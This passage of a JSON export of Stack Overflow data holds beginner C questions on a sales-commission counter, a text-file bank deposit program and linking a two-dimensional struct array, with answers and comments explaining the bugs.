every iteration of the loop.</p>\n\n<p>Also, you should initialize <code>gross</code> to some value other than <code>0</code> so that you don't exit the loop before you even get a chance to get a value. <code>-1</code> would work for an initial value.</p>\n"}, {"comments": [{"owner": {"reputation": 5, "user_id": 5446498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34e7ccda3eb9d5821d337c32f557c352?s=128&d=identicon&r=PG&f=1", "display_name": "dee j", "link": "https://stackoverflow.com/users/5446498/dee-j"}, "edited": false, "score": 0, "creation_date": 1444851801, "post_id": 33134044, "comment_id": 54079961, "body": "if i wanted it to generate by using a random int how would i do that?"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 5, "user_id": 5446498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34e7ccda3eb9d5821d337c32f557c352?s=128&d=identicon&r=PG&f=1", "display_name": "dee j", "link": "https://stackoverflow.com/users/5446498/dee-j"}, "edited": false, "score": 0, "creation_date": 1444852037, "post_id": 33134044, "comment_id": 54080093, "body": "Inside your loop, instead of using scanf to get <code>gross</code> you could do something like: <code>gross = rand()%3001;</code> which generates a random number between 0 and 3000. But note that this is pseudo random and needs to be seeded to give you different answers each time you run the program. Google will tell you more on this. <a href=\"http://www.tutorialspoint.com/c_standard_library/c_function_rand.htm\" rel=\"nofollow noreferrer\">tutorialspoint.com/c_standard_library/c_function_rand.htm</a>"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 5, "user_id": 5446498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34e7ccda3eb9d5821d337c32f557c352?s=128&d=identicon&r=PG&f=1", "display_name": "dee j", "link": "https://stackoverflow.com/users/5446498/dee-j"}, "edited": false, "score": 0, "creation_date": 1444852267, "post_id": 33134044, "comment_id": 54080227, "body": "I just updated my post. My suggested condition for your while loop was also wrong. The one I have now edited is correct and seems correct when I run your code with that condition"}, {"owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1444856776, "post_id": 33134044, "comment_id": 54082762, "body": "@MPI_What That happens to be harmless in his case, but I doubt it&#39;s what he actually wants. It is very unusual to actually process the sentinel value."}], "tags": [], "owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "is_accepted": false, "score": 0, "last_activity_date": 1444852164, "last_edit_date": 1444852164, "creation_date": 1444851159, "answer_id": 33134044, "question_id": 33133478, "link": "https://stackoverflow.com/questions/33133478/intro-to-programming-c/33134044#33134044", "title": "Intro to programming C", "body": "<p>As well as the other answers, your while loop condition makes no sense.</p>\n\n<p>You start with <code>gross = 0;</code></p>\n\n<p>Then your loop immediately says \n<code>while(gross != 0)</code> </p>\n\n<p>I.e. if gross isn't 0 do something.</p>\n\n<p>But gross is 0. Because that's what you set it to be.</p>\n\n<p>So it just exits immediately after printing the array values which are all initialised to 0. Hence your zeroes.</p>\n\n<p>You can fix it by putting something more sensible in your while loop condition. Like:</p>\n\n<p><code>while(! (gross &gt; 3000))</code></p>\n\n<p>or something if you want it to exit when something above that is typed.</p>\n"}], "owner": {"reputation": 5, "user_id": 5446498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34e7ccda3eb9d5821d337c32f557c352?s=128&d=identicon&r=PG&f=1", "display_name": "dee j", "link": "https://stackoverflow.com/users/5446498/dee-j"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 166, "favorite_count": 0, "answer_count": 3, "score": -5, "last_activity_date": 1444852164, "creation_date": 1444849182, "last_edit_date": 1444850963, "question_id": 33133478, "link": "https://stackoverflow.com/questions/33133478/intro-to-programming-c", "title": "Intro to programming C", "body": "<p>I need some help with this problem:</p>\n\n<blockquote>\n  <p>A company pays its salespeople on a commission basis. The salespeople receive $100.00 per week plus 9% of their gross sales for that week. For example, a sales person whose gross sale in a week is $3000.00 will receive $370.00 (100.00 + 3000 * 0.09). \n  Write a C program that (using an array of counters) determines how many of salespeople earned salaries in each of the following ranges:  </p>\n  \n  <p>i.    $100 - 199<br>\n  ii. $200 \u2013 299<br>\n  iii.    $300 \u2013 399<br>\n  iv. $400 \u2013 499<br>\n  v.  $500 \u2013 599<br>\n  vi. $600 \u2013 699<br>\n  vii.    $700 \u2013 799<br>\n  viii.   $800 \u2013 899<br>\n  ix. $900 \u2013 999<br>\n  x.  $1000 and above<br>\n  Note: Round each salesperson\u2019s salary to whole number.  </p>\n  \n  <p>Test your program for a randomly generated gross sales data between 0 and 15000 for a team of 30 salespeople.  </p>\n  \n  <p>Document and indent your source code appropriately for high readability.</p>\n</blockquote>\n\n<p>Here's what I have so far:</p>\n\n<pre><code>  #include &lt;stdio.h&gt;\n  #include &lt;math.h&gt;\n\n    int main()\n{  \n    int salesperson[10] = {};\n\n    int gross = 0;\n    int commission = 1;\n\n    {   \n        while(gross != 0);\n        printf(\"please enter a number from 0-3000 %\\n;\");\n        printf(\"Enter gross sales: \");\n        scanf(\"%d\", &amp;gross);\n        commission = 100 + (.09 * gross);\n\n        if (commission &gt;= 100 &amp;&amp; commission &lt;= 199)\n        {\n            salesperson[0]++;\n        }\n\n        if (commission &gt;= 200 &amp;&amp; commission &lt;= 299)\n        {\n            salesperson[1]++;\n        }\n\n        if (commission &gt;= 300 &amp;&amp; commission &lt;= 399)\n        {\n            salesperson[2]++;\n        }\n\n        if (commission &gt;= 400 &amp;&amp; commission &lt;= 499)\n        {\n            salesperson[3]++;\n        }\n\n        if (commission &gt;= 500 &amp;&amp; commission &lt;= 599)\n        {\n            salesperson[4]++;\n        }\n\n        if (commission &gt;= 600 &amp;&amp; commission &lt;= 699)\n        {\n            salesperson[5]++;\n        }\n\n        if (commission &gt;= 700 &amp;&amp; commission &lt;= 799)\n        {\n            salesperson[6]++;\n        }\n\n        if (commission &gt;= 800 &amp;&amp; commission &lt;= 899)\n        {\n            salesperson[7]++;\n        }\n\n        if (commission &gt;= 900 &amp;&amp; commission &lt;= 999)\n\n        {\n\n            salesperson[8]++;\n        }\n        if (commission &gt;= 1000)\n        {\n            salesperson[9]++;\n        }\n\n    }\n       printf(\"a) $100-199:%d\\n\", salesperson[0]);\n       printf(\"b) $200-299: %d\\n\", salesperson[1]);\n       printf(\"c) $300-399: %d\\n\", salesperson[2]);\n       printf(\"d) $400-499; %d\\n\", salesperson[3]);\n       printf(\"e) $500-599: %d\\n\", salesperson[4]);\n      printf(\"f) $600-699: %d\\n\", salesperson[5]);\n      printf(\"g) $700-799: %d\\n\", salesperson[6]);\n      printf(\"h) $800-899: %d\\n\", salesperson[7]);\n      printf(\"i)$900-999:%d\\n\", salesperson[8]);\n      printf(\"j) $1000 and over: %d\\n\", salesperson[9]);\n\n\n\n\n\n\n    return 0;\n}\n</code></pre>\n\n<p>When I run the program my results keep coming to 0, and I don't know why. Can someone help me?</p>\n"}, {"tags": ["c", "file", "edit"], "comments": [{"owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 4, "creation_date": 1444848726, "post_id": 33133262, "comment_id": 54078196, "body": "Add lots of logging output to your program so that you can see where it&#39;s going wrong. Or use a debugger."}], "answers": [{"tags": [], "owner": {"reputation": 79096, "user_id": 865874, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ACMnN.png?s=128&g=1", "display_name": "rodrigo", "link": "https://stackoverflow.com/users/865874/rodrigo"}, "is_accepted": false, "score": 1, "last_activity_date": 1444848770, "creation_date": 1444848770, "answer_id": 33133377, "question_id": 33133262, "link": "https://stackoverflow.com/questions/33133262/bank-account-deposit-option-using-text-file-in-c/33133377#33133377", "title": "Bank account deposit option using text file in C", "body": "<p>From man <code>scanf</code>, but <code>fscanf()</code> works similarly, about what to read when a character is specified in the format string:</p>\n\n<blockquote>\n  <p>An ordinary character (i.e., one other than white space or '%').  This character must exactly match the next character of input.</p>\n</blockquote>\n\n<p>when you do for example:</p>\n\n<pre><code>fscanf(originalFile, \"Account Holder First Name : %s\", enter.first_name);\n</code></pre>\n\n<p>you do not have this exact text in the file, you wrote something like <code>\"First Name : %s \\n\"</code>. And that will not match.</p>\n\n<p>Also, if the user name have some space in it that code will not work as expected. My advice would be to simplify the format, maybe by writing one datum on each line. Then read whole lines with <code>fgets()</code> and parse the line, if needed, with <code>scanf()</code>.</p>\n\n<p>On more serious projects you may want to consider using a proper database, or even sqlite.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 5351873, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52795829d074c562db8f2aa48251dd9?s=128&d=identicon&r=PG", "display_name": "AC2015", "link": "https://stackoverflow.com/users/5351873/ac2015"}, "is_accepted": false, "score": 0, "last_activity_date": 1444849554, "last_edit_date": 1444849554, "creation_date": 1444849115, "answer_id": 33133449, "question_id": 33133262, "link": "https://stackoverflow.com/questions/33133262/bank-account-deposit-option-using-text-file-in-c/33133449#33133449", "title": "Bank account deposit option using text file in C", "body": "<p>I believe you should use the references in the following lines:</p>\n\n<pre><code>fscanf(originalFile, \"Account Number : %d\", enter.account_number);\nfscanf(originalFile, \"Account Holder First Name : %s\", enter.first_name);\nfscanf(originalFile, \"Account Holder Last Nam : %s\", enter.last_name);\nfscanf(originalFile, \"Balance : %f\", enter.accountBalance);\n</code></pre>\n\n<p>so that they read:</p>\n\n<pre><code>fscanf(originalFile, \"Account Number : %d\", &amp;enter.account_number);\nfscanf(originalFile, \"Account Holder First Name : %s\", enter.first_name);\nfscanf(originalFile, \"Account Holder Last Nam : %s\", enter.last_name);\nfscanf(originalFile, \"Balance : %f\", &amp;enter.accountBalance);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1875, "user_id": 5057191, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d3a861c87b46363f63080839bbc699f2?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. E", "link": "https://stackoverflow.com/users/5057191/mr-e"}, "edited": false, "score": 0, "creation_date": 1444852253, "post_id": 33133799, "comment_id": 54080216, "body": "You should better have another file that links customers and their accounts/file names (Like a dictionary) in case you have lot of accounts it will be faster than opening each file"}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 1, "last_activity_date": 1444850271, "creation_date": 1444850271, "answer_id": 33133799, "question_id": 33133262, "link": "https://stackoverflow.com/questions/33133262/bank-account-deposit-option-using-text-file-in-c/33133799#33133799", "title": "Bank account deposit option using text file in C", "body": "<p>From comments and answers there are probably severals bugs in your program <em>(\"there's always one more bug!\")</em>. Mine is that I can't see any \"append\" mode when updating the file. In <code>create()</code> you have</p>\n\n<pre><code>FILE *originalFile = fopen(\"Bank.txt\",\"w\");\n</code></pre>\n\n<p>This will destroy the file you already have. In <code>deposit()</code> You make a new file with a single customer, you then delete the file you had, and rename the new one. It might be better to add a record with </p>\n\n<pre><code>FILE *originalFile = fopen(\"Bank.txt\",\"a\");\n</code></pre>\n\n<p>But I would not even do that. I would have one file for each customer, named by its account, say <code>10042.txt</code>. If the customer does not know the account number, you could then search each file for the name (and PIN?).</p>\n"}], "owner": {"reputation": 19, "user_id": 5446472, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204935111961844/picture?type=large", "display_name": "Abed Balhawan", "link": "https://stackoverflow.com/users/5446472/abed-balhawan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2682, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1452721015, "creation_date": 1444848435, "last_edit_date": 1452721015, "question_id": 33133262, "link": "https://stackoverflow.com/questions/33133262/bank-account-deposit-option-using-text-file-in-c", "title": "Bank account deposit option using text file in C", "body": "<p>I'm trying to make a simple bank program and I'm trying to get the deposit part to work, I'm using a text file to store information such as Account number, account holder first and last name and the balance in the account. </p>\n\n<p>I'm trying to do here is to get the user to enter an account number which then the program will open the existing file called Bank.txt and check if there is a matching account number. if there is the program will then proceed to ask the user to enter the value to deposit, and if not then the program will simply tell the user that the account number doesn\u2019t exist.</p>\n\n<p>The problem I have is when I first run the program and create an account everything runs fine but as soon as I close the program and reopen it, it doesn\u2019t find the matching account number in the file even though it already exists. </p>\n\n<p>Full code below:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include&lt;conio.h&gt;\n#define SIZE 10 000\n#define NAME_LEN 60\n#define MAX_ACCOUNT 1000\n\nstruct bank\n{\n    int account_number;\n    char first_name[NAME_LEN+1];\n    char last_name[NAME_LEN+1];\n    float accountBalance;\n} enter;\n\nvoid create();\n/*void searchAccounts();\nvoid viewAccounts();\nvoid sortAccounts();\nvoid withdraw();\nvoid deposit();\nvoid Account_Balance();\nvoid Account_eliminate();\n*/\nint main(void)\n{\n    int ch;\n    while(1)\n        {\n            printf(\"\\t\\t\\t      Welcome to KTH Elektro Bank! \\n \\t\\t     Please select your options form the menu below 1-9\\n\\n\");\n            printf(\"\\t\\t 1 : Create Account\\n\");\n            printf(\"\\t\\t 2 : Search Accounts\\n\");\n            printf(\"\\t\\t 3 : View Accounts\\n\");\n            printf(\"\\t\\t 4 : Sort Accounts\\n\");\n            printf(\"\\t\\t 5 : Deposit \\n\");\n            printf(\"\\t\\t 6 : Withdraw \\n\");\n            printf(\"\\t\\t 7 : Check Balance \\n\");\n            printf(\"\\t\\t 8 : Delete Account \\n\");\n            printf(\"\\t\\t 9 : Exit \\n\\n\");\n            printf(\"\\t\\t please enter choice : \");\n            scanf(\"%d\", &amp;ch);\n            switch(ch)\n            {\n               case 1: create();\n                        break;\n            /*  case 2: searchAccounts();\n                        break;\n                case 3: viewAccounts();\n                        break;\n                case 4: sortAccounts();\n                        break;*/\n                case 5: deposit();\n                        break;/*\n                case 6: withdraw();\n                        break;\n                case 7: Account_Balance();\n                        break;\n                case 8: Account_eliminate();\n                        break;*/\n                case 9: exit(0);\n                        default: printf(\"\\t\\tEnter 1-9 Only\");\n                        getch();\n            }\n        }\n}\n\nvoid create()\n{\n    FILE *originalFile = fopen(\"Bank.txt\",\"w\");\n    printf(\"\\n\\t\\t Account Creation Page\\n\");\n    printf(\"\\t\\t Enter Desired Account Number Minimum 6 Digits! : \");\n        scanf(\"%d\", &amp;enter.account_number);\n    printf(\"\\t\\t Enter Your First Name : \");\n        scanf(\"%s\",  enter.first_name);\n    printf(\"\\t\\t Enter Your Last Name : \");\n        scanf(\"%s\",  enter.last_name);\n    printf(\"\\t\\t Your balance is by default set to 0 KR \\n\\n\");\n        enter.accountBalance = 0;\n    fprintf(originalFile,\"\\n Account Number : %d \\n First Name : %s \\n Last Name : %s \\n Balance : %f\", enter.account_number,enter.first_name, enter.last_name, enter.accountBalance);\n    fclose(originalFile);\n    getch();\n}\n\nvoid deposit()\n{\n    printf(\"\\n\\t\\t Deposit Page\\n\");\n\n    int acc_no;\n    printf(\"\\t\\t Enter The Account Number of the Account \\n\\t\\t You Would Like To Deposit To : \");\n    scanf(\"%d\", &amp;acc_no);\n\n    FILE *originalFile = fopen(\"Bank.txt\", \"r\");\n    FILE *newFile = fopen(\"BankTemp.txt\", \"w\");\n    fscanf(originalFile, \"Account Number : %d\", enter.account_number);\n    fscanf(originalFile, \"Account Holder First Name : %s\", enter.first_name);\n    fscanf(originalFile, \"Account Holder Last Nam : %s\", enter.last_name);\n    fscanf(originalFile, \"Balance : %f\", enter.accountBalance);\n\n    if (acc_no == enter.account_number)\n    {\n        float balance;\n        printf(\"\\n\\t\\t Enter The Amount You Would Like To Deposit : \");\n        scanf(\"%f\", &amp;balance);\n        enter.accountBalance = balance + enter.accountBalance;\n        fprintf(newFile, \"\\n Account Number : %d \\n First Name : %s \\n Last Name : %s \\n Balance : %f\", enter.account_number, enter.first_name, enter.last_name, enter.accountBalance);\n        fclose(newFile);\n        fclose(originalFile);\n        remove(\"Bank.txt\");\n        rename(\"BankTemp.txt\", \"Bank.txt\");\n    }\n\n    if(acc_no != enter.account_number)\n    {\n        printf(\"\\t\\t Account Number Doesn't Exist\\n\");\n        fclose(originalFile);\n        fclose(newFile);\n        remove(\"BankTemp.txt\");\n    }\n\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "multidimensional-array", "struct"], "comments": [{"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1444849239, "post_id": 33133175, "comment_id": 54078492, "body": "Adding <code>n</code> to a typed pointer <code>T * p;</code> lets the pointer&#39;s value increase by <code>n * sizeof (T)</code> bytes."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444849355, "post_id": 33133175, "comment_id": 54078562, "body": "There is no type <code>struct a</code> in the code shown so far."}, {"owner": {"reputation": 26583, "user_id": 1441, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fb7f1cd450084fdb4bfc9376c7dba2a7?s=128&d=identicon&r=PG", "display_name": "crashmstr", "link": "https://stackoverflow.com/users/1441/crashmstr"}, "edited": false, "score": 0, "creation_date": 1444850547, "post_id": 33133175, "comment_id": 54079257, "body": "When you have compiler or linker errors, specify the exact error messages. Also, <code>int v=;</code>?"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1444883890, "post_id": 33133175, "comment_id": 54090753, "body": "You need <code>typedef struct a {</code> etc., in order for <code>struct a *prev;</code> to mean a pointer to this struct.  Un-tagged struct is different type to <code>struct a</code>."}], "answers": [{"comments": [{"owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 0, "creation_date": 1444848404, "post_id": 33133225, "comment_id": 54077993, "body": "Compiler says, incompatible types while assigning (in the second assignment)"}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 0, "creation_date": 1444848568, "post_id": 33133225, "comment_id": 54078094, "body": "@Maxsteel, It will be best if you can post an <a href=\"http://stackoverflow.com/help/mcve\">MCVE</a>."}, {"owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 0, "creation_date": 1444848647, "post_id": 33133225, "comment_id": 54078150, "body": "This code is as complete as it can get. It is independent of anything else in my complete code. Sorry, if you can point what&#39;s missing, I can correct it."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 1, "creation_date": 1444848762, "post_id": 33133225, "comment_id": 54078217, "body": "@Maxsteel, the posted definition of <code>a</code> is not right. It should be <code>typedef struct a { ... } a;</code>. I&#39;m not sure whether that&#39;s tripping up your compiler."}, {"owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 0, "creation_date": 1444848861, "post_id": 33133225, "comment_id": 54078272, "body": "Is the logic to get to the address of the prev block correct? I will try to change the def meanwhile."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 0, "creation_date": 1444849176, "post_id": 33133225, "comment_id": 54078454, "body": "@Maxsteel, I don&#39;t know whether that is right or wrong. It&#39;s not clear from your post how the objects in the 2D array are linked. Is any object from <code>b[0]</code> linked with any object from <code>b[1]</code>?"}, {"owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 0, "creation_date": 1444849258, "post_id": 33133225, "comment_id": 54078508, "body": "No, they&#39;re not. Only the structs in same row should be linked to it&#39;s previous node."}, {"owner": {"reputation": 2405, "user_id": 2216129, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/U0xqx.jpg?s=128&g=1", "display_name": "Topological Sort", "link": "https://stackoverflow.com/users/2216129/topological-sort"}, "edited": false, "score": 0, "creation_date": 1444849718, "post_id": 33133225, "comment_id": 54078772, "body": "About the MCVE:  your code doesn&#39;t have a main program, and doesn&#39;t allocate space for a.  That&#39;s the way in which it isn&#39;t complete.  If you can get a version that compiles (or would compile except for that error), it will be easier to help."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1444849909, "post_id": 33133225, "comment_id": 54078887, "body": "Ha! It&#39;s not! :-S Your latest snippet still uses <code>-&gt;next&#47;prev</code> but <code>.next&#47;prev</code>."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1444850102, "post_id": 33133225, "comment_id": 54078999, "body": "@alk, you&#39;d think I could follow my own suggestion :)"}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 1, "last_activity_date": 1444850074, "last_edit_date": 1444850074, "creation_date": 1444848308, "answer_id": 33133225, "question_id": 33133175, "link": "https://stackoverflow.com/questions/33133175/confused-in-pointers-of-two-dimensional-struct/33133225#33133225", "title": "Confused in pointers of two dimensional struct", "body": "<p><code>b[i][j]</code> is not a pointer. Hence, You cannot use:</p>\n\n<pre><code>b[i][j]-&gt;prev = NULL;\n</code></pre>\n\n<p>Use</p>\n\n<pre><code>b[i][j].prev = NULL;\n</code></pre>\n\n<p><strong>Update</strong></p>\n\n<p>The links between the objects can be created using:</p>\n\n<pre><code>for(j=0;j&lt;d2;j++)\n{\n    // Fix the prev link\n    if (j==0) //if first block, point to NULL\n        b[i][j].prev = NULL;\n    else //else point to previous block.\n        b[i][j].prev = &amp;b[i][j-1];\n\n     // Fix the next link\n    if (j==d2-1) //if last block, point to NULL\n        b[i][j].next = NULL;\n    else //else point to next block.\n        b[i][j].next = &amp;b[i][j+1];\n</code></pre>\n\n<p>}</p>\n"}, {"comments": [{"owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 0, "creation_date": 1444864339, "post_id": 33134436, "comment_id": 54085919, "body": "Am I not setting next/prev of x and not b?"}], "tags": [], "owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "is_accepted": false, "score": 1, "last_activity_date": 1444883311, "last_edit_date": 1444883311, "creation_date": 1444852483, "answer_id": 33134436, "question_id": 33133175, "link": "https://stackoverflow.com/questions/33133175/confused-in-pointers-of-two-dimensional-struct/33134436#33134436", "title": "Confused in pointers of two dimensional struct", "body": "<p>I'm guessing that you want elements within each row to be dlinked but not against previous rows.  My take:</p>\n\n<pre><code>void\nfill(void)\n{\n    int d1;\n    int d2;\n    a **b;\n    a *x;\n    int i;\n    int j;\n\n    d1 = 10;\n    d2 = 20;\n\n    b = calloc(d1 * d2,sizeof(a));\n\n    x = &amp;b[0][0];\n\n    for (i=0;  i&lt;d1;  i++) {\n        x-&gt;prev = NULL;\n        x-&gt;next = x + 1;\n        for (x++, j=1;  j&lt;d2;  j++, x++) {\n            x-&gt;prev = x - 1;\n            x-&gt;next = x + 1;\n        }\n        x[-1].next = NULL;\n    }\n}\n</code></pre>\n\n<p>UPDATE:</p>\n\n<p>Pointer arithmetic when you add n to a pointer.  If n is 1, you are <em>not</em> adding 1 to the address, you're adding sizeof(*ptr).  Consider that all of the following are equivalent:</p>\n\n<pre><code>int *xp;\nint n;\n\n(A1) xp += n;\n(A2) xp = (int *) (((unsigned long) xp) + (n * sizeof(int)))\n(A3) xp = &amp;xp[n];\n(A4) xp = (int *) (((char *) xp) + (n * sizeof(int)))\n</code></pre>\n\n<p>Stare at this for a while until you truly understand why this is true.  This is <em>key</em>.  The value you add to a pointer should exactly equal the index value of an array of the same type.</p>\n\n<p>Your code is broken in a few ways:<br>\n- You need to replace <code>b[i][j]-&gt;prev</code> with <code>b[i][j].prev</code> because <code>b[i][j]</code> already fully dereferences the pointer [<em>this was pointed out by others</em>]<br>\n- When you're doing <code>*(b[i] + j - sizeof(b[i][j])</code>, I'm not even sure what you'll get.<br>\n- You want <code>&amp;b[i][j-1]</code> (A3).  Your code [if it works at all], probably produces <code>&amp;b[i][j-18]</code>.<br>\n- This is because your mixing pointer arithmetic and byte sizes (e.g. you're doing a mashup of (A1), (A2), and (A3) above--you can use one or the other but not both/all at the same time)</p>\n\n<p>My code only needs a single pointer that is set at the beginning because it's incremented by 1 in the inner loop.<br>\nNote that after finishing the \"j loop\", <code>x == &amp;b[i][d2]</code> which is also <code>&amp;b[i+1][0]</code>.  That might help make it clearer.<br>\nAlso, I handle the j==0 case before the inner j loop and post fix the \"j==d2-1\" case afterwards.  That way, no if's inside the inner loop and why it starts at 1, not 0<br>\nNote that <code>x[-1].next</code> (case A3) is <code>(x - 1)-&gt;next</code> (case A1)</p>\n\n<p>Here the loops are recoded slightly to be a bit simpler/faster.  It assumes an addition variable: <code>a *ep;</code></p>\n\n<pre><code>for (i=0;  i&lt;d1;  i++) {\n    x-&gt;prev = NULL;\n    x-&gt;next = x + 